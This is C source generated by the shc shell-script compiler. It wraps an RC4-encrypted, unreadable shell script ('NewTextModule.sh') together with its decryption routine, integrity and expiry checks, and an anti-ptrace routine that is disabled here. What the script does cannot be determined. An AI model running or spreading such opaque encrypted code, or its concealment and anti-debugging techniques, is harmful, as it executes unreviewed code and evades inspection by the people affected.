#if 0
	shc Version 3.8.7, Generic Script Compiler
	Copyright (c) 1994-2009 Francisco Rosales <frosal@fi.upm.es>

	shc -v -r -T -f NewTextModule.sh 
#endif

static  char data [] = 
#define      tst2_z	19
#define      tst2	((&data[2]))
	"\331\173\340\354\217\004\227\210\312\375\376\272\224\071\310\227"
	"\347\331\147\155\014\116\217\210\141"
#define      tst1_z	22
#define      tst1	((&data[29]))
	"\170\131\212\267\007\156\215\100\157\041\263\261\106\043\215\333"
	"\043\177\357\216\014\325\102\130\147\302\272\361\245\222"
#define      msg1_z	42
#define      msg1	((&data[65]))
	"\262\237\145\150\340\372\127\240\345\356\045\307\003\122\177\062"
	"\173\330\321\147\002\310\272\164\227\204\251\325\355\376\240\134"
	"\132\022\220\220\126\110\261\204\153\347\240\275\346\054\160\105"
	"\323\102\270\014\175\276\152\313\116"
#define      chk2_z	19
#define      chk2	((&data[112]))
	"\344\172\001\211\143\116\015\074\003\216\024\005\373\124\024\375"
	"\010\155\001\303\345\103"
#define      date_z	1
#define      date	((&data[134]))
	"\307"
#define      text_z	2572
#define      text	((&data[380]))
	"\152\200\236\352\062\075\120\233\036\112\363\276\060\342\074\357"
	"\114\010\076\076\065\011\002\032\115\037\213\110\366\355\350\141"
	"\155\207\113\237\305\233\072\343\346\056\242\027\020\336\006\134"
	"\347\104\233\034\116\235\067\233\275\302\343\264\257\314\025\035"
	"\124\140\274\031\374\367\374\343\045\236\372\066\175\001\222\144"
	"\105\056\201\223\314\270\057\211\173\023\075\053\337\122\110\063"
	"\263\005\114\260\375\111\223\043\350\216\131\146\217\354\313\324"
	"\032\114\150\346\005\230\160\200\253\255\254\213\000\365\276\264"
	"\372\013\144\370\125\370\033\076\206\165\244\026\141\157\352\173"
	"\274\123\142\301\354\322\102\227\200\356\042\201\343\341\066\336"
	"\355\233\326\103\223\361\201\032\146\046\060\310\225\033\104\121"
	"\157\246\023\133\171\125\362\372\103\025\174\047\366\262\005\344"
	"\115\333\047\341\315\250\373\064\316\054\374\144\110\100\266\267"
	"\347\311\023\141\036\005\133\142\033\327\211\022\211\216\366\327"
	"\152\035\270\067\306\264\153\225\340\150\371\051\250\260\340\220"
	"\171\363\361\230\371\124\133\365\006\343\134\356\336\102\164\110"
	"\362\210\244\374\032\311\207\346\240\342\120\103\225\137\154\146"
	"\310\357\034\165\352\245\155\137\137\124\154\340\153\227\255\221"
	"\344\115\171\275\103\353\062\364\144\020\357\156\305\016\114\331"
	"\017\246\347\252\041\275\302\251\216\104\111\131\353\014\042\376"
	"\250\132\215\306\127\377\147\357\315\155\205\126\347\305\171\346"
	"\154\375\114\376\045\222\067\176\376\034\374\050\002\031\236\311"
	"\177\215\230\267\244\037\211\033\044\117\327\312\264\263\151\033"
	"\215\012\367\111\073\361\254\001\317\110\210\345\050\161\114\175"
	"\173\105\127\273\110\125\162\046\074\057\124\242\360\017\005\172"
	"\125\076\145\001\100\147\027\007\200\114\242\263\032\037\062\001"
	"\237\321\220\046\012\376\320\355\123\040\274\253\242\074\373\033"
	"\300\021\050\261\311\277\245\110\045\050\047\244\226\276\020\033"
	"\207\217\322\302\226\336\111\116\113\154\045\066\107\362\147\105"
	"\274\013\253\171\273\115\356\335\030\103\216\011\005\011\161\306"
	"\162\367\133\020\033\204\171\156\204\252\371\057\233\021\310\073"
	"\043\161\240\225\045\341\136\156\322\250\241\043\304\163\326\107"
	"\046\176\223\053\251\215\153\075\362\050\233\125\221\311\157\174"
	"\325\337\206\235\270\213\165\222\367\123\227\360\330\315\352\324"
	"\310\012\230\305\047\332\146\002\370\324\034\122\166\000\260\216"
	"\015\273\213\040\174\363\114\242\055\353\153\323\351\327\341\102"
	"\121\256\276\376\055\077\216\131\101\001\146\046\317\100\351\152"
	"\237\162\175\173\262\034\323\210\036\042\303\145\026\244\150\244"
	"\060\232\045\163\366\351\234\335\146\106\010\332\261\356\211\374"
	"\043\054\145\255\351\263\134\303\316\302\252\073\013\124\056\103"
	"\272\050\204\013\314\321\260\005\153\006\106\166\023\207\132\173"
	"\042\347\162\200\361\240\264\063\265\374\353\345\210\060\020\000"
	"\160\120\366\070\162\253\124\310\177\272\263\153\046\316\361\341"
	"\047\306\124\361\267\023\024\070\161\346\054\375\363\371\137\047"
	"\132\015\142\023\330\164\252\336\137\356\231\135\235\136\312\026"
	"\334\261\026\323\073\100\050\337\066\360\076\227\021\070\030\332"
	"\052\116\346\062\103\257\070\035\002\232\117\055\274\010\156\223"
	"\120\370\153\335\143\047\110\247\242\301\273\064\310\235\054\050"
	"\337\234\236\017\235\067\122\244\152\053\051\162\046\215\161\017"
	"\160\335\126\174\334\010\345\155\074\034\131\074\314\167\234\375"
	"\241\311\074\044\357\116\264\140\364\311\324\104\172\326\010\133"
	"\360\071\163\160\267\022\002\070\231\064\166\316\353\224\072\263"
	"\126\177\377\145\341\243\056\323\171\176\301\334\247\272\115\135"
	"\347\070\162\040\361\335\310\133\332\355\351\345\212\110\241\362"
	"\016\311\364\133\066\155\236\340\337\312\204\337\242\374\106\014"
	"\325\021\124\340\232\353\050\101\006\014\344\304\056\343\041\337"
	"\230\252\211\014\304\270\074\256\320\360\131\205\336\072\117\105"
	"\102\364\043\067\163\273\020\141\151\203\263\366\314\245\002\000"
	"\332\142\264\255\037\177\167\162\161\075\317\172\266\334\063\340"
	"\015\061\250\161\362\367\240\236\360\326\316\365\042\371\260\200"
	"\345\376\175\363\147\366\116\236\027\173\170\153\230\360\370\235"
	"\136\112\263\210\132\073\323\051\132\056\117\247\177\107\257\073"
	"\104\207\233\357\056\200\072\357\027\060\156\127\342\133\062\151"
	"\001\161\042\077\230\146\156\274\051\234\122\100\320\241\042\024"
	"\071\165\356\061\110\141\171\217\303\001\336\002\051\105\243\365"
	"\033\325\330\153\050\165\166\131\003\060\122\250\276\117\361\005"
	"\102\067\303\163\301\137\333\325\151\135\231\332\036\077\211\162"
	"\064\107\143\034\340\351\331\230\267\315\153\257\071\345\145\021"
	"\042\327\305\012\021\246\310\064\041\275\032\155\327\142\035\126"
	"\277\375\350\252\074\066\103\023\163\030\132\112\273\224\334\031"
	"\311\051\105\240\010\130\262\357\123\044\316\324\306\236\377\261"
	"\106\101\004\261\034\265\141\052\342\035\321\120\216\227\275\314"
	"\116\374\371\215\271\064\205\102\210\121\327\311\220\132\137\267"
	"\222\155\143\337\072\377\221\236\205\115\036\051\227\007\103\157"
	"\362\160\325\035\014\125\077\206\037\347\106\105\317\050\366\221"
	"\122\253\004\101\127\065\375\253\041\161\202\306\176\240\244\314"
	"\133\210\125\060\246\147\031\246\133\232\034\264\135\056\353\036"
	"\004\266\340\006\236\266\357\353\152\210\004\066\143\003\342\125"
	"\333\201\055\131\064\046\032\112\133\357\006\076\142\240\272\364"
	"\100\227\277\167\057\110\142\345\327\205\147\070\004\240\215\307"
	"\150\121\316\007\113\306\016\240\221\332\200\210\045\122\177\321"
	"\047\346\321\213\126\241\107\235\017\377\145\047\016\166\146\221"
	"\045\313\135\240\026\112\273\344\354\273\102\044\370\031\317\021"
	"\220\301\332\056\040\022\201\001\315\366\236\003\032\044\012\353"
	"\047\161\232\347\007\205\341\376\132\026\067\063\334\005\225\362"
	"\371\030\257\145\051\336\237\062\154\377\046\111\345\003\253\073"
	"\300\271\034\036\352\366\305\027\037\267\026\155\030\216\101\153"
	"\056\167\305\007\163\057\005\320\165\057\032\306\035\017\234\161"
	"\150\373\333\343\166\116\102\062\245\064\076\016\267\233\005\154"
	"\100\067\356\036\174\266\370\160\056\026\042\023\150\302\355\203"
	"\202\026\162\157\240\115\242\357\214\051\330\377\375\126\246\376"
	"\346\205\174\272\330\212\116\052\012\152\021\332\146\321\243\373"
	"\345\336\154\126\130\311\073\314\213\125\202\115\250\232\343\353"
	"\321\063\364\376\341\262\332\307\247\215\132\242\347\370\007\177"
	"\034\145\254\056\212\173\006\355\174\023\027\251\014\123\316\076"
	"\137\026\224\364\050\143\031\344\062\311\351\165\112\221\037\301"
	"\175\353\350\101\111\301\165\154\316\217\342\007\121\313\042\003"
	"\002\060\177\154\247\057\053\157\113\252\345\030\150\171\316\025"
	"\065\106\271\350\144\225\314\273\356\337\346\146\137\202\026\351"
	"\345\344\057\077\266\272\112\240\151\205\132\143\106\111\243\334"
	"\264\317\023\210\323\355\174\045\240\107\337\155\130\240\013\251"
	"\263\322\056\167\130\327\312\106\222\022\262\262\162\024\104\272"
	"\061\024\110\220\374\142\042\046\160\026\255\272\061\001\052\371"
	"\037\067\233\145\076\252\320\253\206\314\000\063\104\361\377\100"
	"\044\320\047\222\042\022\106\161\007\241\376\260\214\267\236\141"
	"\307\144\177\167\377\332\063\136\226\372\006\005\011\274\172\056"
	"\330\255\235\362\172\135\327\001\370\201\171\241\031\003\356\275"
	"\261\276\052\033\107\146\233\207\153\257\111\054\307\151\142\155"
	"\225\172\145\020\324\234\063\305\275\213\002\270\314\043\131\115"
	"\003\045\027\242\222\270\253\304\011\200\373\075\157\026\113\200"
	"\363\127\223\060\305\272\362\235\277\011\143\032\353\054\250\004"
	"\255\332\333\332\203\106\042\053\046\124\064\327\334\337\251\305"
	"\367\305\166\113\162\060\367\175\054\156\217\162\271\173\375\312"
	"\136\105\306\045\113\341\255\010\345\057\163\145\156\217\340\124"
	"\014\340\360\364\045\312\264\331\100\213\300\362\115\361\375\110"
	"\244\176\264\352\237\065\123\272\227\161\165\137\075\257\352\175"
	"\324\147\207\002\323\212\327\274\212\225\315\373\033\055\047\065"
	"\275\121\216\200\251\270\136\050\312\122\355\050\371\051\147\314"
	"\117\212\061\060\115\136\212\356\324\100\262\076\030\172\045\370"
	"\344\301\132\200\134\304\106\017\250\261\353\320\210\037\167\332"
	"\122\117\211\364\177\257\063\366\367\341\376\161\207\056\020\302"
	"\010\151\142\005\017\200\042\315\347\311\331\162\001\303\177\362"
	"\133\310\074\114\265\301\000\311\016\050\317\061\067\063\257\252"
	"\332\126\134\313\323\143\043\006\056\026\024\132\053\202\034\312"
	"\137\273\302\227\252\312\140\037\244\241\360\145\336\377\104\045"
	"\060\071\105\123\306\045\153\055\264\050\032\164\103\150\252\156"
	"\262\026\162\363\154\244\302\043\135\055\320\311\375\031\020\333"
	"\373\020\354\031\165\257\111\010\353\002\253\360\132\074\354\341"
	"\337\277\021\342\137\254\025\341\113\250\075\366\174\005\021\040"
	"\277\103\030\375\333\013\306\052\137\165\315\205\023\175\262\350"
	"\306\131\354\054\146\014\053\115\147\021\071\140\136\317\214\032"
	"\137\372\367\142\160\063\174\014\004\131\125\220\277\367\360\170"
	"\037\301\103\261\301\341\073\374\237\140\115\346\302\317\111\165"
	"\260\302\217\171\000\256\072\236\360\021\173\302\205\314\317\367"
	"\013\213\135\273\336\132\265\053\051\331\317\272\007\242\224\036"
	"\377\002\037\353\215\157\105\335\120\171\132\150\177\315\120\237"
	"\344\251\212\223\056\103\300\334\123\174\200\244\151\066\217\174"
	"\304\111\315\163\330\354\115\152\041\253\207\205\341\061\116\137"
	"\021\211\372\307\241\175\145\125\102\030\075\244\212\124\246\026"
	"\312\017\232\130\277\374\344\342\021\113\171\367\116\126\245\131"
	"\174\000\337\240\167\251\163\023\017\254\367\250\137\301\076\041"
	"\152\220\020\012\130\072\001\230\025\302\220\356\220\137\064\232"
	"\040\363\305\370\067\024\367\344\354\010\363\207\041\244\043\014"
	"\270\130\146\334\363\225\360\127\256\311\212\241\367\025\343\236"
	"\213\156\124\205\034\207\205\205\366\005\041\125\026\071\326\114"
	"\245\373\027\062\311\143\220\113\334\310\352\005\167\217\011\342"
	"\135\022\022\160\356\171\361\345\314\073\074\165\055\077\076\325"
	"\337\273\111\255\003\246\122\256\137\075\105\325\210\242\172\307"
	"\215\054\344\111\114\276\173\373\306\211\371\105\213\301\352\211"
	"\201\256\136\035\366\051\315\011\064\033\021\101\036\243\146\077"
	"\037\122\205\002\011\357\261\201\101\242\012\344\126\107\253\155"
	"\302\301\320\133\367\160\266\206\240\067\213\053\271\101\374\236"
	"\165\304\254\235\051\267\335\362\147\243\247\107\121\255\010\264"
	"\175\072\153\124\057\142\241\156\105\204\236\125\317\301\247\224"
	"\271\240\175\014\361\130\000\151\134\032\133\370\352\305\026\075"
	"\101\175\006\362\262\342\042\316\135\275\255\307\267\217\101\137"
	"\007\034\255\352\260\325\267\174\235\174\061\177\176\360\116\014"
	"\324\001\324\310\171\035\267\071\002\370\153\040\360\157\047\117"
	"\121\107\034\301\332\042\352\221\340\026\205\042\354\241\111\003"
	"\363\120\311\171\344\156\002\107\371\225\126\212\154\107\210\004"
	"\000\113\253\361\211\257\131\010\162\113\363\320\014\102\332\104"
	"\372\115\350\004\376\355\306\303\335\270\067\217\342\345\066\327"
	"\100\202\310\127\051\324\135\277\162\126\373\003\172\176\125\311"
	"\362\242\355\062\075\116\331\032\030\020\133\212\336\017\164\362"
	"\222\147\140\301\272\074\257\373\232\064\256\367\001\007\074\117"
	"\357\177\207\104\320\176\221\127\371\062\101\375\175\306\351\242"
	"\077\137\332\201\260\231\350\255\012\230\216\024\153\130\317\233"
	"\072\041\122\176\161\021\041\267\363\322\101\335\350\025\314\137"
	"\224\365\217\020\057\023\262\333\052\333\337\377\041\353\030\152"
	"\153\306\101\107\107\235\075\010\221\217\314\115\176\063\312\113"
	"\142\020\170\237\072\055\337\124\366\223\267\110\054\117\131\311"
	"\166\220\330\074\253\314\136\324\041\130\164\064\065\352\004\142"
	"\343\124\153\030\327\325\201\375\254\227\021\356\364\147\224\350"
	"\311\215\006\033\233\362\341\044\100\156\160\060\332\214\133\001"
	"\115\215\362\310\014\357\141\264\153\103\320\246\216\226\072\032"
	"\175\226\326\224\177\216\056\070\253\100\213\054\126\240\244\136"
	"\261\114\372\025\044\203\047\256\022\035\205\174\073\076\263\001"
	"\362\037\227\323\207\220\374\060\101\335\300\272\321\261\123\313"
	"\376\115\340\042\321\007\321\343\044\126\137\140\225\023\141\210"
	"\062\370\133\272\211\130\352\313\066\252\205\007\134\330\322\132"
	"\046\262\175\367\272\116\333\336\245\073\076\072\116\240\302\201"
	"\231\036\073\043\167\045\356\256\320\164\265\054\115\210\207\163"
	"\073\004\153\365\123\106\324\370\201\023\063\317\263\366\121\115"
	"\025\214\161\214\262\137\072\203\324\360\260\041\171\067\224\265"
	"\073\000\252\216\106\176\207\307\222\272\227\106\261\351\223\306"
	"\166\004\123\051\144\216\254\070\176\134\131\370\224\356\255\320"
	"\356\130\137\065\327\346\375\151\241\224\257\122\175\103\031\364"
	"\107\154\035\254\372\311\345\171\046\077\162\272\055\037\213\034"
	"\167\352\122\116\320\117\267\162\343\147\305\141\252\336\125\362"
	"\112\162\236\105\074\203\277\143\302\061\036\360\120\251\015\310"
	"\223\137\026\144\256\316\326\222\065\234\364\340\172\112\322\305"
	"\275\161\013\371\365\312\135\270\373\173\251\114\044\266\024\267"
	"\026\053\034\305\371\363\130\057\217\114\020\012\227\342\320\124"
	"\123\333\116\111\245\253\001\241\046\252\355\113\141\002\002\167"
	"\055\036\075\046\021\225\126\241\342\146\253\171\111\173\316\235"
	"\126\034\346\374\310\347\236\356\221\214\071\363\216\074\152\273"
	"\133\250\342\155\076\070\016\040\237\272\232\350\065\151\206\214"
	"\205\154\211\116\124\050\075\346\264\166\331\102\263\104\375\017"
	"\354\337\175\052\030\213\113\270\106\345\241\174\117\047\011\324"
	"\224\223\043\350\273\140\317\157\327\250\262\212\354\257\232\331"
	"\217\027\003\250\243\117\140\351\065\001\146\204\050\157\131\274"
	"\002\174\245\275\334"
#define      lsto_z	1
#define      lsto	((&data[3356]))
	"\030"
#define      shll_z	10
#define      shll	((&data[3359]))
	"\011\217\104\332\346\175\015\354\306\074\234\157"
#define      pswd_z	256
#define      pswd	((&data[3426]))
	"\357\346\307\222\066\047\174\153\050\342\357\121\122\111\016\124"
	"\305\263\022\241\047\100\124\104\037\222\116\257\153\061\316\132"
	"\030\225\355\116\275\152\272\346\115\252\067\237\363\105\363\270"
	"\371\006\131\041\106\256\146\146\101\312\313\264\342\061\264\305"
	"\102\164\045\225\205\154\007\032\020\105\115\240\237\020\073\177"
	"\053\260\352\175\363\163\111\225\075\025\111\040\106\375\345\211"
	"\162\012\036\367\167\046\022\207\154\137\047\013\157\142\213\233"
	"\023\165\030\006\351\142\233\047\167\345\107\276\343\055\107\125"
	"\067\146\115\257\214\137\066\371\276\136\005\055\301\220\311\324"
	"\006\341\332\357\103\166\026\273\133\136\172\076\214\301\223\304"
	"\050\340\163\265\077\252\256\376\011\263\053\312\104\364\237\112"
	"\326\171\072\032\360\121\326\114\260\120\212\074\022\036\000\072"
	"\377\163\357\077\036\236\075\047\121\151\361\225\136\221\340\064"
	"\012\033\117\373\154\045\107\034\165\322\131\207\361\131\302\360"
	"\315\261\060\353\120\156\023\241\327\005\067\066\226\030\153\241"
	"\063\272\234\237\340\343\274\126\266\025\336\247\157\240\230\074"
	"\122\310\050\242\066\073\104\016\100\173\104\327\223\257\170\306"
	"\151\024\146\111\370\042\237\256\070\175\126\247\036\356\344\160"
	"\266\014\023\355\110\127\373\211\322\077\140\146\356\330\055\127"
	"\355\223\241\345\266\101\224\357\277\264\026\254\346\344\007\376"
#define      chk1_z	22
#define      chk1	((&data[3694]))
	"\070\137\010\036\254\375\146\130\100\011\216\103\304\116\124\043"
	"\206\327\027\027\257\327\333\074\136\304\153\262"
#define      xecc_z	15
#define      xecc	((&data[3718]))
	"\233\344\014\253\007\273\044\006\374\072\270\327\214\337\212\341"
	"\100\135"
#define      msg2_z	19
#define      msg2	((&data[3736]))
	"\266\157\010\266\370\223\021\333\125\156\116\025\237\314\124\215"
	"\217\200\210\372\215\146\034"
#define      inlo_z	3
#define      inlo	((&data[3758]))
	"\265\240\054"
#define      rlax_z	1
#define      rlax	((&data[3761]))
	"\047"
#define      opts_z	1
#define      opts	((&data[3762]))
	"\363"/* End of data[] */;
#define      hide_z	4096
#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
#define TRACEABLE	1	/* Define as 1 to enable ptrace the executable */

/* rtc.c */

#include <sys/stat.h>
#include <sys/types.h>

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

/* 'Alleged RC4' */

static unsigned char stte[256], indx, jndx, kndx;

/*
 * Reset arc4 stte. 
 */
void stte_0(void)
{
	indx = jndx = kndx = 0;
	do {
		stte[indx] = indx;
	} while (++indx);
}

/*
 * Set key. Can be used more than once. 
 */
void key(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		do {
			tmp = stte[indx];
			kndx += tmp;
			kndx += ptr[(int)indx % len];
			stte[indx] = stte[kndx];
			stte[kndx] = tmp;
		} while (++indx);
		ptr += 256;
		len -= 256;
	}
}

/*
 * Crypt data. 
 */
void arc4(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		indx++;
		tmp = stte[indx];
		jndx += tmp;
		stte[indx] = stte[jndx];
		stte[jndx] = tmp;
		tmp += stte[indx];
		*ptr ^= stte[tmp];
		ptr++;
		len--;
	}
}

/* End of ARC4 */

/*
 * Key with file invariants. 
 */
int key_with_file(char * file)
{
	struct stat statf[1];
	struct stat control[1];

	if (stat(file, statf) < 0)
		return -1;

	/* Turn on stable fields */
	memset(control, 0, sizeof(control));
	control->st_ino = statf->st_ino;
	control->st_dev = statf->st_dev;
	control->st_rdev = statf->st_rdev;
	control->st_uid = statf->st_uid;
	control->st_gid = statf->st_gid;
	control->st_size = statf->st_size;
	control->st_mtime = statf->st_mtime;
	control->st_ctime = statf->st_ctime;
	key(control, sizeof(control));
	return 0;
}

#if DEBUGEXEC
void debugexec(char * sh11, int argc, char ** argv)
{
	int i;
	fprintf(stderr, "shll=%s\n", sh11 ? sh11 : "<null>");
	fprintf(stderr, "argc=%d\n", argc);
	if (!argv) {
		fprintf(stderr, "argv=<null>\n");
	} else { 
		for (i = 0; i <= argc ; i++)
			fprintf(stderr, "argv[%d]=%.60s\n", i, argv[i] ? argv[i] : "<null>");
	}
}
#endif /* DEBUGEXEC */

void rmarg(char ** argv, char * arg)
{
	for (; argv && *argv && *argv != arg; argv++);
	for (; argv && *argv; argv++)
		*argv = argv[1];
}

int chkenv(int argc)
{
	char buff[512];
	unsigned long mask, m;
	int l, a, c;
	char * string;
	extern char ** environ;

	mask  = (unsigned long)&chkenv;
	mask ^= (unsigned long)getpid() * ~mask;
	sprintf(buff, "x%lx", mask);
	string = getenv(buff);
#if DEBUGEXEC
	fprintf(stderr, "getenv(%s)=%s\n", buff, string ? string : "<null>");
#endif
	l = strlen(buff);
	if (!string) {
		/* 1st */
		sprintf(&buff[l], "=%lu %d", mask, argc);
		putenv(strdup(buff));
		return 0;
	}
	c = sscanf(string, "%lu %d%c", &m, &a, buff);
	if (c == 2 && m == mask) {
		/* 3rd */
		rmarg(environ, &string[-l - 1]);
		return 1 + (argc - a);
	}
	return -1;
}

#if !TRACEABLE

#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>

#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
#	define PTRACE_ATTACH	PT_ATTACH
#endif
void untraceable(char * argv0)
{
	char proc[80];
	int pid, mine;

	switch(pid = fork()) {
	case  0:
		pid = getppid();
		/* For problematic SunOS ptrace */
#if defined(__FreeBSD__)
		sprintf(proc, "/proc/%d/mem", (int)pid);
#else
		sprintf(proc, "/proc/%d/as",  (int)pid);
#endif
		close(0);
		mine = !open(proc, O_RDWR|O_EXCL);
		if (!mine && errno != EBUSY)
			mine = !ptrace(PTRACE_ATTACH, pid, 0, 0);
		if (mine) {
			kill(pid, SIGCONT);
		} else {
			perror(argv0);
			kill(pid, SIGKILL);
		}
		_exit(mine);
	case -1:
		break;
	default:
		if (pid == waitpid(pid, 0, 0))
			return;
	}
	perror(argv0);
	_exit(1);
}
#endif /* !TRACEABLE */

char * xsh(int argc, char ** argv)
{
	char * scrpt;
	int ret, i, j;
	char ** varg;

	stte_0();
	 key(pswd, pswd_z);
	arc4(msg1, msg1_z);
	arc4(date, date_z);
	if (date[0] && (atoll(date)<time(NULL)))
		return msg1;
	arc4(shll, shll_z);
	arc4(inlo, inlo_z);
	arc4(xecc, xecc_z);
	arc4(lsto, lsto_z);
	arc4(tst1, tst1_z);
	 key(tst1, tst1_z);
	arc4(chk1, chk1_z);
	if ((chk1_z != tst1_z) || memcmp(tst1, chk1, tst1_z))
		return tst1;
	ret = chkenv(argc);
	arc4(msg2, msg2_z);
	if (ret < 0)
		return msg2;
	varg = (char **)calloc(argc + 10, sizeof(char *));
	if (!varg)
		return 0;
	if (ret) {
		arc4(rlax, rlax_z);
		if (!rlax[0] && key_with_file(shll))
			return shll;
		arc4(opts, opts_z);
		arc4(text, text_z);
		arc4(tst2, tst2_z);
		 key(tst2, tst2_z);
		arc4(chk2, chk2_z);
		if ((chk2_z != tst2_z) || memcmp(tst2, chk2, tst2_z))
			return tst2;
		if (text_z < hide_z) {
			/* Prepend spaces til a hide_z script size. */
			scrpt = malloc(hide_z);
			if (!scrpt)
				return 0;
			memset(scrpt, (int) ' ', hide_z);
			memcpy(&scrpt[hide_z - text_z], text, text_z);
		} else {
			scrpt = text;	/* Script text */
		}
	} else {			/* Reexecute */
		if (*xecc) {
			scrpt = malloc(512);
			if (!scrpt)
				return 0;
			sprintf(scrpt, xecc, argv[0]);
		} else {
			scrpt = argv[0];
		}
	}
	j = 0;
	varg[j++] = argv[0];		/* My own name at execution */
	if (ret && *opts)
		varg[j++] = opts;	/* Options on 1st line of code */
	if (*inlo)
		varg[j++] = inlo;	/* Option introducing inline code */
	varg[j++] = scrpt;		/* The script itself */
	if (*lsto)
		varg[j++] = lsto;	/* Option meaning last option */
	i = (ret > 1) ? ret : 0;	/* Args numbering correction */
	while (i < argc)
		varg[j++] = argv[i++];	/* Main run-time arguments */
	varg[j] = 0;			/* NULL terminated array */
#if DEBUGEXEC
	debugexec(shll, j, varg);
#endif
	execvp(shll, varg);
	return shll;
}

int main(int argc, char ** argv)
{
#if DEBUGEXEC
	debugexec("main", argc, argv);
#endif
#if !TRACEABLE
	untraceable(argv[0]);
#endif
	argv[1] = xsh(argc, argv);
	fprintf(stderr, "%s%s%s: %s\n", argv[0],
		errno ? ": " : "",
		errno ? strerror(errno) : "",
		argv[1] ? argv[1] : "<null>"
	);
	return 1;
}
